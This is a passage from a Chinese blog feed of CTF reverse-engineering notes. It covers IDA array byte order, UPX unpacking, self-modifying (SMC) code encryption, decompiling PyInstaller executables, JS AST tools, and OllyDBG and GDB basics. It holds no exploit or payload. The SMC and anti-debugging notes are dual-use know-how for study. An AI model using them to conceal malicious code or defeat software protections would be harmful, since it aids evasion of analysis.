href="#在-IDA-中，F5-查看伪代码后，如果看到：" class="headerlink" title="在 IDA 中，F5 查看伪代码后，如果看到："></a>在 IDA 中，F5 查看伪代码后，如果看到：</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">_DWORD v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD6C0B67</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x175F4078</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3302058</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x725D1244</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2E1F3441</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6847404D</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1B</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意最开始的数据类型，这个数组不仅要按照4字节左侧补零对齐，还要将每一组数据翻转拼接才能得到正确的字符串，ida并没有非常智能地帮你捋顺字符串，所以初学的话非常有迷惑性</p></blockquote><blockquote><p>例如：<br><code>v4[2] = 0x3302058；</code><br>应为 0x03302058 –&gt; 0x58，0x20，0x30，0x03</p></blockquote><hr><h3 id="db、dw、dd、dq"><a href="#db、dw、dd、dq" class="headerlink" title="db、dw、dd、dq"></a>db、dw、dd、dq</h3><blockquote><p>伪指令 db、dw、dd、dq 都可以定义字符串，但最多的是用 db 来定义字符串</p></blockquote><ol><li>第一个原因是 dw、dd定义的字符串到了内存中排序是相反的<ul><li><strong>在字符串 “abcd” 中，元素按从 高位 向 低位 线性排序</strong></li><li><strong>在内存中，数据由 低位 向 高位 线性排序</strong></li><li>因此字符串 “abcd” 在内存中的顺序是从 低位 向 高位 排序的，所以相反，即 小端序</li></ul></li><li>第二个原因是 不同版本编译器对 dw 与 dd 定义字符串的指令格式支持不一样<ul><li>db 定义字节类型变量，一个字节数据占 1个 字节单元，读完一个，偏移量加 1 （ 1个 十六进制数）</li><li>dw 定义字类型变量，一个字数据占 2个 字节单元，读完一个，偏移量加 2 （ 2个 十六进制数）</li><li>dd 定义双字类型变量，一个双字数据占 4个 字节单元，读完一个，偏移量加 4 （ 4个 十六进制数）</li><li>dq 定义四字类型变量，一个四字数据占 8个 字节单元，读完一个，偏移量加 8 （ 8个 十六进制数）</li></ul></li><li><strong>db 是一字节，按顺序一个一个存储</strong><ul><li><em>用 db 定义字符串时，存储方式是顺着的，即 大端序</em></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UPX脱壳</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/UPX%E8%84%B1%E5%A3%B3/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/UPX%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="upx-脱壳工具下载地址"><a href="#upx-脱壳工具下载地址" class="headerlink" title="upx 脱壳工具下载地址"></a>upx 脱壳工具下载地址</h2><blockquote><p><a href="https://fossies.org/windows/misc/upx-3.96-win64.zip/">upx 3.96-win64 - Download</a></p></blockquote><hr><h2 id="脱壳操作"><a href="#脱壳操作" class="headerlink" title="脱壳操作"></a>脱壳操作</h2><ol><li><p>将加壳文件置于解压后的 <code>D:\upx-3.96-win64</code> 文件夹下</p></li><li><p>脱壳语句：</p></li></ol><blockquote><p>upx -d &lt;脱壳文件名&gt;</p></blockquote><p><img src="https://s2.loli.net/2023/03/17/ID3qzT9Nl6f85B1.png" alt="CTF - Reverse_upx 脱壳1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMC自解码</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/SMC%E8%87%AA%E8%A7%A3%E7%A0%81/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/SMC%E8%87%AA%E8%A7%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><blockquote><p><strong>自修改代码</strong>，简而言之，就是程序中的部分代码在运行之前被加密成一段数据，不可反编译，通过程序运行后执行相关的解码功能，对加密的代码数据进行解密，让其恢复正常功能</p></blockquote><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>代码在二进制文件中就是字节码，本身也就是一段二进制数据</li><li>提前手动将要修改的代码部分替换为加密数据，运行自己的函数对修改部分进行解码</li><li>通过这种方式，对核心代码进行 <code>SMC</code> 加密，<em>程序在被静态反编译的时候，核心代码就是一串数据无法反编译，而程序在运行的时候又能成功将这段核心代码复原</em>。从而实现保护程序，同时亦可以将一些特征代码变形隐藏</li></ul><hr><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><blockquote><p>写在前面：在自己实现 <code>SMC</code> 时，一定注意 <code>SMC</code> 加解密代码所属的节区是否有<strong>可写权限</strong></p></blockquote><ol><li>有两个函数，一个函数加密，一个函数解密，两者对应</li><li>找到要进行 <code>SMC</code> 的代码地址，然后事先在程序开始的地方设置：对该地址数据的解密函数</li><li>取出要进行 <code>SMC</code> 的代码的字节码，对其进行加密操作得到一串加密数据</li><li>用这串加密数据替换原代码的字节码</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python逆向</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/Python%E9%80%86%E5%90%91/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/Python%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h2 id="Python逆向特点"><a href="#Python逆向特点" class="headerlink" title="Python逆向特点"></a>Python逆向特点</h2><ul><li>在 exeinfo pe 中查看到文件信息：<br><img src="https://s2.loli.net/2023/03/17/fS2HF8Oa6CUBYtP.png" alt="CTF - Reverse_Python逆向1.png"></li><li><mark>在文件信息中出现 PyInstaller 即为 Python 文件经过 pyinstaller 打包生成的可执行 .exe 文件</mark></li><li>这类由 Python 生成的可执行文件无法通过 IDA 反编译，需要使用 pyinstxtractor.py 文件进行解包得到 Python 的反编译文件 .pyc</li></ul><hr><h2 id="Python-逆向流程"><a href="#Python-逆向流程" class="headerlink" title="Python 逆向流程"></a>Python 逆向流程</h2><ul><li>下载 pyinstxtractor.py 工具包<br><img src="https://s2.loli.net/2023/03/17/A7Nq8RfxQdyTu25.png" alt="CTF - Reverse_Python逆向2.png"></li></ul><ol><li>将 pyinstxtractor.py 文件置于 pyinstaller 打包成的 .exe 文件夹下</li><li>在该目录下执行 cmd，输入：</li></ol><blockquote><p><code>python pyinstxtractor.py &lt;exe 文件名&gt;</code></p></blockquote><ol start="3"><li>转换后会在该目录下生成一个文件夹，其中必定存在一个无后缀名的 struct 文件，通过 exeinfo pe 可查看该文件为 .pyc 文件<mark>【必要时可用它恢复文件头】</mark></li></ol><hr><h2 id="Python-反编译"><a href="#Python-反编译" class="headerlink" title="Python 反编译"></a>Python 反编译</h2><ul><li><p>在 .pyc 文件目录下，执行 cmd：</p><blockquote><p><code>uncompyle6 &lt; pyc 文件名&gt;</code><br><code>uncompyle6 -o &lt; py 文件名&gt; &lt; pyc 文件名&gt;</code></p></blockquote></li><li><p>若 Python 版本不对，会提示 KeyError: ‘3.10.4’ （ 3.10.4 为 Python 版本）</p></li></ul><hr><h2 id="pyc-文件头"><a href="#pyc-文件头" class="headerlink" title="pyc 文件头"></a>pyc 文件头</h2><ul><li>1</li><li>方法一：<br>通过 Pycharm 手动生成 .pyc 文件，获取文件头，代码如下：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 代码开头需导入py_compile</span><span class="token keyword">import</span> py_compile<span class="token comment"># 随意写正确的python代码即可</span><span class="token keyword">def</span> <span class="token function">print_hi</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Hi, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>print_hi<span class="token punctuation">(</span><span class="token string">'PyCharm'</span><span class="token punctuation">)</span><span class="token comment"># 最后调用该函数进行编译操作，单引号中是保存路径</span>py_compile<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'D:\py_project'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>方法二：<br>通过 cmd 命令生成 .pyc 文件</p><blockquote><p><code>python -m py_compile &lt;py 文件名&gt;</code></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS逆向</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/JS%E9%80%86%E5%90%91/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/JS%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h2 id="抽象语法树-AST"><a href="#抽象语法树-AST" class="headerlink" title="抽象语法树 AST"></a>抽象语法树 AST</h2><blockquote><p>源代码的抽象语法结构的树状表示，树上的每个节点都表示源代码中的一种结构</p><p>抽象表示把 js 代码进行了结构化的转化，转化为一种数据结构。这种数据结构其实就是一个大的 json 对象</p></blockquote><blockquote><p>简单理解，就是把我们写的代码按照一定的规则转换成一种树形结构</p></blockquote><hr><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><ol><li><p>一组简单的 AST 树状结构：</p><p>转换前：</p></li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> team <span class="token operator">=</span> <span class="token string">'大转转FE'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转换后：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>  <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclaration"</span><span class="token punctuation">,</span>      <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>      <span class="token string-property property">"declarations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclarator"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>          <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>            <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"team"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token string-property property">"init"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Literal"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">11</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>            <span class="token string-property property">"value"</span><span class="token operator">:</span> <span class="token string">"大转转FE"</span><span class="token punctuation">,</span>            <span class="token string-property property">"raw"</span><span class="token operator">:</span> <span class="token string">"'大转转FE'"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string-property property">"kind"</span><span class="token operator">:</span> <span class="token string">"const"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string-property property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"module"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>拆解一个简单的 add 函数<br>转换前：</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>转换后：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"FunctionDeclaration"</span><span class="token punctuation">,</span>      <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>        <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"add"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token string-property property">"expression"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"generator"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"async"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"params"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">13</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">14</span><span class="token punctuation">,</span>          <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"a"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">16</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">17</span><span class="token punctuation">,</span>          <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"b"</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"BlockStatement"</span><span class="token punctuation">,</span>        <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>        <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"ReturnStatement"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">24</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>            <span class="token string-property property">"argument"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"BinaryExpression"</span><span class="token punctuation">,</span>              <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">,</span>              <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>              <span class="token string-property property">"left"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>                <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">,</span>                <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">32</span><span class="token punctuation">,</span>                <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"a"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token string-property property">"operator"</span><span class="token operator">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span>              <span class="token string-property property">"right"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>                <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">35</span><span class="token punctuation">,</span>                <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>                <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"b"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string-property property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"module"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="生成抽象语法树"><a href="#生成抽象语法树" class="headerlink" title="生成抽象语法树"></a>生成抽象语法树</h2><ul><li>在线网站：<a href="https://astexplorer.net/">AST explorer</a></li></ul><hr><h2 id="语法树还原成代码"><a href="#语法树还原成代码" class="headerlink" title="语法树还原成代码"></a>语法树还原成代码</h2><ul><li><p>用 <code>escodegen</code> 将 JavaScript AST 转化为代码</p></li><li><p>使用 npm 命令安装 escodegen 模块</p><blockquote><p><code>npm i escodegen -g</code></p></blockquote></li><li><p>使用 escodegen 将 js 语句的 AST 语法树 —— json 文件转化成 js 代码</p><blockquote><p><code>esgenerate &lt; json 文件名&gt;</code></p></blockquote></li></ul><hr><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><ul><li>得到的 js 代码可以直接在浏览器的控制台中运行</li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OllyDBG界面</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/OllyDBG%E7%95%8C%E9%9D%A2/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/OllyDBG%E7%95%8C%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="初始界面为：”LCG-主线程，模块”-窗口"><a href="#初始界面为：”LCG-主线程，模块”-窗口" class="headerlink" title="初始界面为：”LCG - 主线程，模块” 窗口"></a>初始界面为：”LCG - 主线程，模块” 窗口</h2><p><img src="https://s2.loli.net/2023/03/17/OZlFD46pGIxSwKr.png" alt="OllyDBG和GDB_OllyDBG界面1.png"></p><h3 id="反汇编窗口"><a href="#反汇编窗口" class="headerlink" title="反汇编窗口"></a>反汇编窗口</h3><ul><li>载入程序后，窗口内显示的是程序反汇编后的源代码</li></ul><h3 id="信息窗口"><a href="#信息窗口" class="headerlink" title="信息窗口"></a>信息窗口</h3><ul><li>进行动态调试时，窗口内会显示出当前代码行的各个寄存器的信息，或者API函数的调用、跳转等信息，可以用来辅助了解当前代码行的寄存器的运行情况</li></ul><h3 id="数据窗口"><a href="#数据窗口" class="headerlink" title="数据窗口"></a>数据窗口</h3><ul><li>默认以十六进制的方式显示内存中的数据</li></ul><h3 id="寄存器窗口"><a href="#寄存器窗口" class="headerlink" title="寄存器窗口"></a>寄存器窗口</h3><ul><li>动态显示CPU各个寄存器的内容，包括数据寄存器、指针及变址寄存器、段寄存器，以及控制寄存器中的程序状态字寄存器</li></ul><h3 id="堆栈窗口"><a href="#堆栈窗口" class="headerlink" title="堆栈窗口"></a>堆栈窗口</h3><ul><li>显示堆栈的内容。调用API函数或子程序时，通过查看堆栈可以知道传递的参数等信息</li></ul><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><ul><li>在原本的 OD 中是没有命令行的，这个是一个外置的插件，可以方便地在动态调试时输入命令。一般来说，主要是输入下断点或者清除断点的命令。“命令行命令.txt”文件中有详细的命令及功能介绍，大家可以查看</li></ul>]]></content>
      
      
      <categories>
          
          <category> OllyDBG </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OllyDBG基本操作</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/OllyDBG%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/OllyDBG%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> OllyDBG </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OllyDBG安装</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/OllyDBG%E5%AE%89%E8%A3%85/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/OllyDBG%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="OllyDBG-版本"><a href="#OllyDBG-版本" class="headerlink" title="OllyDBG 版本"></a>OllyDBG 版本</h2><blockquote><p><strong>推荐使用从吾爱破解论坛下载的吾爱破解专用版Ollydbg，该版本具有强大的对抗反调试的功能</strong></p></blockquote><ol><li>下载地址： <a href="http://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">吾爱破解专用版Ollydbg</a></li><li>解压后复制到想放置的路径下，执行 <code>&quot;Udd Cleaner.exe&quot;</code> 、<code>&quot;路径修复工具.exe&quot;</code></li><li>以管理员权限运行 <code>&quot;吾爱破解[LCG].exe&quot;</code> 即可使用</li><li>注意：<mark>“OllyDBG.EXE” 是英文版本，”吾爱破解[LCG].exe” 为全汉化</mark></li></ol><hr><h2 id="OllyDBG-设置"><a href="#OllyDBG-设置" class="headerlink" title="OllyDBG 设置"></a>OllyDBG 设置</h2><h3 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a>字体设置</h3><ol><li>在界面选项里，将字体设置为 “系统等宽字体”，点击更改，选择好字体、字体大小</li><li>在初始窗口中，右键 -&gt; 界面选项 -&gt; 全局字体 -&gt; 系统等宽字体</li></ol>]]></content>
      
      
      <categories>
          
          <category> OllyDBG </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB基本操作</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/GDB%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/GDB%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>操作</th><th>指令</th></tr></thead><tbody><tr><td><strong>调试程序</strong></td><td><code>gdb &lt;文件名&gt;</code></td></tr><tr><td><strong>下断点</strong></td><td><code>b &lt;函数名&gt;</code></td></tr><tr><td><strong>删除断点</strong></td><td><code>d</code></td></tr><tr><td><strong>执行程序</strong></td><td><code>r</code></td></tr><tr><td><strong>单步执行</strong></td><td><code>n</code></td></tr><tr><td><strong>直接执行到程序结束</strong></td><td><code>c</code></td></tr><tr><td><strong>查看寄存器的值</strong></td><td><code>i r &lt;寄存器名&gt;</code></td></tr><tr><td><strong>修改寄存器的值</strong></td><td><code>set $&lt;寄存器名&gt; = &lt;修改的值&gt;</code></td></tr><tr><td><strong>退出调试</strong></td><td><code>q</code></td></tr><tr><td><strong>单步执行，遇到函数会进入</strong></td><td><code>s</code></td></tr><tr><td><strong>将当前程序执行流跳转到指定行或地址</strong></td><td><code>j</code></td></tr><tr><td><strong>打印变量或寄存器值</strong></td><td><code>p</code></td></tr><tr><td><strong>运行到指定行停下来</strong></td><td><code>u</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> GDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB安装</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/GDB%E5%AE%89%E8%A3%85/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/OllyDBG%20%E5%92%8C%20GDB/GDB%E5%AE%89%E8%A3%85/</url>
      
